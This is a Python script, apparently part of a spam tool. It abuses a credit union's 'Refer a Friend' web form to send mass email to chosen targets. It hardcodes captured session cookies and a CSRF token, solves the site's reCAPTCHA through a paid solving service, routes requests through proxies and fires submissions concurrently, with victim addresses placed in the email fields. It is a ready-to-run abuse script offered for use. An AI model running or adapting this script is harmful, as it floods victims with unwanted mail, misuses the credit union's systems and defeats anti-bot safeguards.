from os.path import basename

import requests

import module

cookies = {
    '__RequestVerificationToken': 'ZRczMi43mExggWXFT5G5uFXZyw-pvxHYdDdwAnlAJiaHv_H48BvMCx3VI55oOf7ZTnnpsocoyuqYIVQGoOy4FKMZXPGR0BpRMGJfZlrEylM1',
    'RSLBServer': '!+aRiKoIrMA1Fl52yxIGJAFH1eQZ9oBcClcOamtgJ4gsRkA4Fx2GRLwjWzUUnpY8mtdnblDdo9XYwOw==',
    '_gcl_au': '1.1.1568742684.1674572335',
    '_gid': 'GA1.2.710016378.1674572337',
    'nmstat': '92cbd339-eeec-27c7-6344-f64009698633',
    '_fbp': 'fb.1.1674572338133.2075503867',
    '_mkto_trk': 'id:186-FTK-345&token:_mch-clearviewfcu.org-1674572338137-65256',
    '_pin_unauth': 'dWlkPU9UTTJaVGxtWVdFdFl6VTBaQzAwTlRGbExXSXlORE10WkRBNE5UazRNekExTWpndw',
    '_clck': 'wv4lua|1|f8j|0',
    '__qca': 'P0-672806957-1674572336747',
    'LPVID': 'IyNzMwZDY1Yjc2ZTA0YzMy',
    'session_id_decrypted': '135519672',
    '__cf_bm': 's285_ZbUwJJqweLrxXFiU3QmRjQwbPxSJj5SYyQ867Y-1674574494-0-Ae5PlpyYI9Ns+Sm/JvGDiJjsBJ9S/8gpoR+3msheoBy3iM5c8qSVg0wM+hL8BdhUvMf7HFep1pCgiBsJf/nsaE4=',
    '_gat_UA-50797253-4': '1',
    '_gat_UA-50797253-8': '1',
    '_tq_id.TV-8172185436-1.0951': '557ac39527d5e2a5.1674572338.0.1674574494..',
    '_ga': 'GA1.2.110158490.1674572337',
    '_gat_gtag_UA_147250513_61': '1',
    '_clsk': '1mexwgm|1674574495466|1|1|k.clarity.ms/collect',
    'LPSID-59516152': 'uExx5HC2QvaH0GoSg_3ezw',
    'session_id': 'YHc1x2ozpqomFb6VoV7k7FIf9mjM5R0+ahUq7oScO+nfwIPw/g==',
    '_ga_ZSKNH8YF2Z': 'GS1.1.1674574493.2.0.1674574515.38.0.0',
}

headers = {
    'authority': 'www.clearviewfcu.org',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryG03lqQkA5HhIFVGB',
    # 'cookie': '__RequestVerificationToken=ZRczMi43mExggWXFT5G5uFXZyw-pvxHYdDdwAnlAJiaHv_H48BvMCx3VI55oOf7ZTnnpsocoyuqYIVQGoOy4FKMZXPGR0BpRMGJfZlrEylM1; RSLBServer=!+aRiKoIrMA1Fl52yxIGJAFH1eQZ9oBcClcOamtgJ4gsRkA4Fx2GRLwjWzUUnpY8mtdnblDdo9XYwOw==; _gcl_au=1.1.1568742684.1674572335; _gid=GA1.2.710016378.1674572337; nmstat=92cbd339-eeec-27c7-6344-f64009698633; _fbp=fb.1.1674572338133.2075503867; _mkto_trk=id:186-FTK-345&token:_mch-clearviewfcu.org-1674572338137-65256; _pin_unauth=dWlkPU9UTTJaVGxtWVdFdFl6VTBaQzAwTlRGbExXSXlORE10WkRBNE5UazRNekExTWpndw; _clck=wv4lua|1|f8j|0; __qca=P0-672806957-1674572336747; LPVID=IyNzMwZDY1Yjc2ZTA0YzMy; session_id_decrypted=135519672; __cf_bm=s285_ZbUwJJqweLrxXFiU3QmRjQwbPxSJj5SYyQ867Y-1674574494-0-Ae5PlpyYI9Ns+Sm/JvGDiJjsBJ9S/8gpoR+3msheoBy3iM5c8qSVg0wM+hL8BdhUvMf7HFep1pCgiBsJf/nsaE4=; _gat_UA-50797253-4=1; _gat_UA-50797253-8=1; _tq_id.TV-8172185436-1.0951=557ac39527d5e2a5.1674572338.0.1674574494..; _ga=GA1.2.110158490.1674572337; _gat_gtag_UA_147250513_61=1; _clsk=1mexwgm|1674574495466|1|1|k.clarity.ms/collect; LPSID-59516152=uExx5HC2QvaH0GoSg_3ezw; session_id=YHc1x2ozpqomFb6VoV7k7FIf9mjM5R0+ahUq7oScO+nfwIPw/g==; _ga_ZSKNH8YF2Z=GS1.1.1674574493.2.0.1674574515.38.0.0',
    'origin': 'https://www.clearviewfcu.org',
    'referer': 'https://www.clearviewfcu.org/About/Get-Started/Refer-a-Friend',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}

params = {
    'formName': 'ReferAFriend',
    'prefix': 'form-ReferAFriend-58dc',
    'displayValidationErrors': 'False',
}
pageurl = 'https://www.clearviewfcu.org/About/Get-Started/Refer-a-Friend'
googlekey = '6LdzN8sZAAAAAJMfKAcsa8DxrCONCVtTqgJfOIXq'


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        captcha = module.CapMonsterSolver().solve(googlekey, pageurl)
        if not captcha:
            return
        text = self.get_text(False)
        data = f'------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="form-ReferAFriend-58dc.YourFirstName.Value"\r\n\r\n{text}\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="form-ReferAFriend-58dc.YourLastName.Value"\r\n\r\n{text}\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="form-ReferAFriend-58dc.YourEmailAddress.Email"\r\n\r\n{target}\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="form-ReferAFriend-58dc.FriendsFirstName.Value"\r\n\r\n{text}\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="form-ReferAFriend-58dc.FriendsLastName.Value"\r\n\r\n{text}\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="form-ReferAFriend-58dc.FriendsEmailAddress.Email"\r\n\r\n{target}\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="form-ReferAFriend-58dc.SourcePage.Value"\r\n\r\nhttps://www.clearviewfcu.org/About/Get-Started/Refer-a-Friend\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="form-ReferAFriend-58dc.Recaptcha.Value"\r\n\r\n\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n{captcha}\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nzT4u2WNOZGK7QOtC0KntrENC1Y3hMl_2ywCojzap9A-3hVERJBW7cz3pKFjR7hM64OZijHwTk26SWzBjYjWgXrEeOdNSqOrsw1nfAwHiRhs1\r\n------WebKitFormBoundaryG03lqQkA5HhIFVGB--\r\n'

        response = requests.post(
            'https://www.clearviewfcu.org/Kentico.PageBuilder/Widgets/en-US/Kentico.FormWidget/FormSubmit',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data.encode(), proxies=self.get_proxies(), timeout=30
        )
        return response


def main():
    s = '{"redirectTo":"/Thank-You"}'

    spam = ConcreteSpam(
        basename(__file__)[:-3], s,
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
